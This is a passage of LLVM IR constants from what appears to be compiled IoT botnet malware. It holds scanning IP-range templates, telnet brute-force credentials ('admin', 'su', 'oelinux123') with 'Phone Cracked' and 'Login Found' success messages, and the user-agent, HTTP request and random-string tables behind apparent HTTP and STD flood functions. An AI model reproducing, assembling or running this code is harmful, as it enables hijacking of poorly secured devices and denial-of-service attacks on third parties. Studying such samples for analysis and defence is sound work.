@.str.216 = private unnamed_addr constant [13 x i8] c"179.94.%d.%d\00", align 1
@.str.217 = private unnamed_addr constant [13 x i8] c"179.95.%d.%d\00", align 1
@.str.218 = private unnamed_addr constant [13 x i8] c"179.96.%d.%d\00", align 1
@.str.219 = private unnamed_addr constant [13 x i8] c"179.97.%d.%d\00", align 1
@.str.220 = private unnamed_addr constant [13 x i8] c"179.98.%d.%d\00", align 1
@.str.221 = private unnamed_addr constant [13 x i8] c"179.99.%d.%d\00", align 1
@.str.222 = private unnamed_addr constant [14 x i8] c"152.240.%d.%d\00", align 1
@.str.223 = private unnamed_addr constant [14 x i8] c"152.242.%d.%d\00", align 1
@.str.224 = private unnamed_addr constant [14 x i8] c"152.243.%d.%d\00", align 1
@.str.225 = private unnamed_addr constant [14 x i8] c"152.244.%d.%d\00", align 1
@.str.226 = private unnamed_addr constant [14 x i8] c"152.245.%d.%d\00", align 1
@.str.227 = private unnamed_addr constant [14 x i8] c"152.246.%d.%d\00", align 1
@.str.228 = private unnamed_addr constant [14 x i8] c"152.247.%d.%d\00", align 1
@.str.229 = private unnamed_addr constant [14 x i8] c"152.248.%d.%d\00", align 1
@.str.230 = private unnamed_addr constant [14 x i8] c"152.249.%d.%d\00", align 1
@.str.231 = private unnamed_addr constant [14 x i8] c"182.189.%d.%d\00", align 1
@.str.232 = private unnamed_addr constant [14 x i8] c"182.190.%d.%d\00", align 1
@.str.233 = private unnamed_addr constant [14 x i8] c"182.191.%d.%d\00", align 1
@.str.234 = private unnamed_addr constant [14 x i8] c"182.188.%d.%d\00", align 1
@.str.235 = private unnamed_addr constant [14 x i8] c"182.187.%d.%d\00", align 1
@.str.236 = private unnamed_addr constant [14 x i8] c"182.186.%d.%d\00", align 1
@.str.237 = private unnamed_addr constant [14 x i8] c"182.184.%d.%d\00", align 1
@.str.238 = private unnamed_addr constant [14 x i8] c"179.100.%d.%d\00", align 1
@.str.239 = private unnamed_addr constant [14 x i8] c"179.101.%d.%d\00", align 1
@.str.240 = private unnamed_addr constant [14 x i8] c"179.102.%d.%d\00", align 1
@.str.241 = private unnamed_addr constant [14 x i8] c"179.103.%d.%d\00", align 1
@.str.242 = private unnamed_addr constant [14 x i8] c"179.110.%d.%d\00", align 1
@.str.243 = private unnamed_addr constant [14 x i8] c"179.111.%d.%d\00", align 1
@.str.244 = private unnamed_addr constant [14 x i8] c"179.112.%d.%d\00", align 1
@.str.245 = private unnamed_addr constant [14 x i8] c"179.113.%d.%d\00", align 1
@.str.246 = private unnamed_addr constant [14 x i8] c"179.114.%d.%d\00", align 1
@.str.247 = private unnamed_addr constant [14 x i8] c"179.115.%d.%d\00", align 1
@.str.248 = private unnamed_addr constant [14 x i8] c"179.116.%d.%d\00", align 1
@.str.249 = private unnamed_addr constant [14 x i8] c"179.117.%d.%d\00", align 1
@.str.250 = private unnamed_addr constant [14 x i8] c"191.193.%d.%d\00", align 1
@.str.251 = private unnamed_addr constant [14 x i8] c"191.194.%d.%d\00", align 1
@.str.252 = private unnamed_addr constant [14 x i8] c"191.195.%d.%d\00", align 1
@.str.253 = private unnamed_addr constant [14 x i8] c"191.196.%d.%d\00", align 1
@.str.254 = private unnamed_addr constant [14 x i8] c"191.197.%d.%d\00", align 1
@.str.255 = private unnamed_addr constant [14 x i8] c"191.198.%d.%d\00", align 1
@.str.256 = private unnamed_addr constant [14 x i8] c"152.250.%d.%d\00", align 1
@.str.257 = private unnamed_addr constant [14 x i8] c"152.251.%d.%d\00", align 1
@.str.258 = private unnamed_addr constant [14 x i8] c"152.252.%d.%d\00", align 1
@.str.259 = private unnamed_addr constant [14 x i8] c"152.253.%d.%d\00", align 1
@.str.260 = private unnamed_addr constant [14 x i8] c"152.254.%d.%d\00", align 1
@.str.261 = private unnamed_addr constant [14 x i8] c"152.255.%d.%d\00", align 1
@.str.262 = private unnamed_addr constant [14 x i8] c"177.112.%d.%d\00", align 1
@.str.263 = private unnamed_addr constant [14 x i8] c"177.113.%d.%d\00", align 1
@.str.264 = private unnamed_addr constant [14 x i8] c"177.114.%d.%d\00", align 1
@.str.265 = private unnamed_addr constant [14 x i8] c"177.115.%d.%d\00", align 1
@.str.266 = private unnamed_addr constant [14 x i8] c"177.116.%d.%d\00", align 1
@.str.267 = private unnamed_addr constant [14 x i8] c"177.117.%d.%d\00", align 1
@.str.268 = private unnamed_addr constant [14 x i8] c"177.118.%d.%d\00", align 1
@.str.269 = private unnamed_addr constant [14 x i8] c"177.119.%d.%d\00", align 1
@.str.270 = private unnamed_addr constant [14 x i8] c"177.120.%d.%d\00", align 1
@.str.271 = private unnamed_addr constant [14 x i8] c"177.121.%d.%d\00", align 1
@.str.272 = private unnamed_addr constant [14 x i8] c"177.138.%d.%d\00", align 1
@.str.273 = private unnamed_addr constant [14 x i8] c"177.139.%d.%d\00", align 1
@.str.274 = private unnamed_addr constant [14 x i8] c"177.144.%d.%d\00", align 1
@.str.275 = private unnamed_addr constant [14 x i8] c"177.145.%d.%d\00", align 1
@.str.276 = private unnamed_addr constant [14 x i8] c"177.146.%d.%d\00", align 1
@.str.277 = private unnamed_addr constant [14 x i8] c"177.147.%d.%d\00", align 1
@.str.278 = private unnamed_addr constant [14 x i8] c"177.160.%d.%d\00", align 1
@.str.279 = private unnamed_addr constant [14 x i8] c"177.161.%d.%d\00", align 1
@.str.280 = private unnamed_addr constant [14 x i8] c"177.162.%d.%d\00", align 1
@.str.281 = private unnamed_addr constant [14 x i8] c"177.163.%d.%d\00", align 1
@.str.282 = private unnamed_addr constant [14 x i8] c"177.168.%d.%d\00", align 1
@.str.283 = private unnamed_addr constant [14 x i8] c"177.169.%d.%d\00", align 1
@.str.284 = private unnamed_addr constant [14 x i8] c"177.170.%d.%d\00", align 1
@.str.285 = private unnamed_addr constant [14 x i8] c"177.171.%d.%d\00", align 1
@.str.286 = private unnamed_addr constant [14 x i8] c"177.172.%d.%d\00", align 1
@.str.287 = private unnamed_addr constant [13 x i8] c"189.96.%d.%d\00", align 1
@.str.288 = private unnamed_addr constant [13 x i8] c"189.97.%d.%d\00", align 1
@.str.289 = private unnamed_addr constant [13 x i8] c"189.98.%d.%d\00", align 1
@.str.290 = private unnamed_addr constant [13 x i8] c"189.99.%d.%d\00", align 1
@.str.291 = private unnamed_addr constant [12 x i8] c"39.34.%d.%d\00", align 1
@.str.292 = private unnamed_addr constant [13 x i8] c"59.103.%d.%d\00", align 1
@.str.293 = private unnamed_addr constant [13 x i8] c"191.12.%d.%d\00", align 1
@.str.294 = private unnamed_addr constant [14 x i8] c"186.117.%d.%d\00", align 1
@.str.295 = private unnamed_addr constant [14 x i8] c"179.131.%d.%d\00", align 1
@.str.296 = private unnamed_addr constant [14 x i8] c"179.129.%d.%d\00", align 1
@.str.297 = private unnamed_addr constant [14 x i8] c"179.170.%d.%d\00", align 1
@.str.298 = private unnamed_addr constant [14 x i8] c"191.206.%d.%d\00", align 1
@.str.299 = private unnamed_addr constant [14 x i8] c"187.118.%d.%d\00", align 1
@.str.300 = private unnamed_addr constant [14 x i8] c"187.116.%d.%d\00", align 1
@.str.301 = private unnamed_addr constant [14 x i8] c"179.224.%d.%d\00", align 1
@.str.302 = private unnamed_addr constant [14 x i8] c"179.166.%d.%d\00", align 1
@.str.303 = private unnamed_addr constant [8 x i8] c"admin\0D\0A\00", align 1
@.str.304 = private unnamed_addr constant [109 x i8] c"\1B[31mPhone Cracked \1B[32m-> \1B[37m%s | \1B[31mUsername \1B[32m-> \1B[37madmin | \1B[31mPassword \1B[32m-> \1B[37madmin\1B[0m\00", align 1
@.str.305 = private unnamed_addr constant [5 x i8] c"su\0D\0A\00", align 1
@.str.306 = private unnamed_addr constant [13 x i8] c"oelinux123\0D\0A\00", align 1
@.str.307 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.308 = private unnamed_addr constant [21 x i8] c"[Attempt] - %s:%s:%s\00", align 1
@.str.309 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.310 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.311 = private unnamed_addr constant [34 x i8] c"[Success] [Login Found]- %s:%s:%s\00", align 1
@sendHTTP.useragents = private unnamed_addr constant [62 x i8*] [i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.313, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.327, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.331, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @.str.341, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.344, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.345, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.346, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.347, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.348, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.349, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.350, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.373, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.376, i32 0, i32 0)], align 16
@.str.377 = private unnamed_addr constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00", align 1
@.str.374 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.375 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.376 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.312 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0  (compatible; Konqueror/3.0; i686 Linux; 20021117)\00", align 1
@.str.313 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@.str.314 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.315 = private unnamed_addr constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00", align 1
@.str.316 = private unnamed_addr constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00", align 1
@.str.317 = private unnamed_addr constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00", align 1
@.str.318 = private unnamed_addr constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00", align 1
@.str.319 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.320 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.321 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.322 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.323 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.324 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.325 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.326 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.327 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.328 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.329 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.330 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.331 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.332 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.333 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.334 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.335 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.336 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.337 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.338 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.339 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.340 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.341 = private unnamed_addr constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.342 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.343 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.344 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.345 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.346 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00", align 1
@.str.347 = private unnamed_addr constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00", align 1
@.str.348 = private unnamed_addr constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00", align 1
@.str.349 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00", align 1
@.str.350 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00", align 1
@.str.351 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00", align 1
@.str.352 = private unnamed_addr constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00", align 1
@.str.353 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00", align 1
@.str.354 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.355 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.356 = private unnamed_addr constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.357 = private unnamed_addr constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00", align 1
@.str.358 = private unnamed_addr constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00", align 1
@.str.359 = private unnamed_addr constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00", align 1
@.str.360 = private unnamed_addr constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00", align 1
@.str.361 = private unnamed_addr constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00", align 1
@.str.362 = private unnamed_addr constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00", align 1
@.str.363 = private unnamed_addr constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00", align 1
@.str.364 = private unnamed_addr constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00", align 1
@.str.365 = private unnamed_addr constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00", align 1
@.str.366 = private unnamed_addr constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00", align 1
@.str.367 = private unnamed_addr constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00", align 1
@.str.368 = private unnamed_addr constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00", align 1
@.str.369 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00", align 1
@.str.370 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00", align 1
@.str.371 = private unnamed_addr constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00", align 1
@.str.372 = private unnamed_addr constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00", align 1
@.str.373 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.386, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.387, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.388, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.389, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.390, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.391, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.392, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.393, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.394, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.396, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.397, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.398, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.399, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.400, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.401, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.402, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.403, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.404, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.405, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.406, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.407, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.408, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.409, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.410, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.411, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.412, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.413, i32 0, i32 0)], align 16
@.str.378 = private unnamed_addr constant [6 x i8] c"arfgG\00", align 1
@.str.379 = private unnamed_addr constant [9 x i8] c"HBiug655\00", align 1
@.str.380 = private unnamed_addr constant [13 x i8] c"KJYDFyljf754\00", align 1
@.str.381 = private unnamed_addr constant [20 x i8] c"LIKUGilkut769458905\00", align 1
@.str.382 = private unnamed_addr constant [17 x i8] c"JHFDSkgfc5747694\00", align 1
@.str.383 = private unnamed_addr constant [12 x i8] c"GJjyur67458\00", align 1
@.str.384 = private unnamed_addr constant [12 x i8] c"RYSDk747586\00", align 1
@.str.385 = private unnamed_addr constant [12 x i8] c"HKJGi5r8675\00", align 1
@.str.386 = private unnamed_addr constant [10 x i8] c"KHGK7985i\00", align 1
@.str.387 = private unnamed_addr constant [11 x i8] c"yuituiILYF\00", align 1
@.str.388 = private unnamed_addr constant [14 x i8] c"GKJDghfcjkgd4\00", align 1
@.str.389 = private unnamed_addr constant [12 x i8] c"uygtfgtrevf\00", align 1
@.str.390 = private unnamed_addr constant [13 x i8] c"tyeuhygbtfvg\00", align 1
@.str.391 = private unnamed_addr constant [9 x i8] c"ewqdcftr\00", align 1
@.str.392 = private unnamed_addr constant [16 x i8] c"trbazetghhnbrty\00", align 1
@.str.393 = private unnamed_addr constant [11 x i8] c"tbhrwsehbg\00", align 1
@.str.394 = private unnamed_addr constant [12 x i8] c"twehgbferhb\00", align 1
@.str.395 = private unnamed_addr constant [12 x i8] c"etrbhhgetrb\00", align 1
@.str.396 = private unnamed_addr constant [14 x i8] c"edfverthbyrtb\00", align 1
@.str.397 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.398 = private unnamed_addr constant [14 x i8] c"zcdbvgdfsbgfd\00", align 1
@.str.399 = private unnamed_addr constant [10 x i8] c"gdfbtsdgb\00", align 1
@.str.400 = private unnamed_addr constant [14 x i8] c"ghdugffytsdyt\00", align 1
@.str.401 = private unnamed_addr constant [14 x i8] c"tgerthgwtrwry\00", align 1
@.str.402 = private unnamed_addr constant [12 x i8] c"yteytietyue\00", align 1
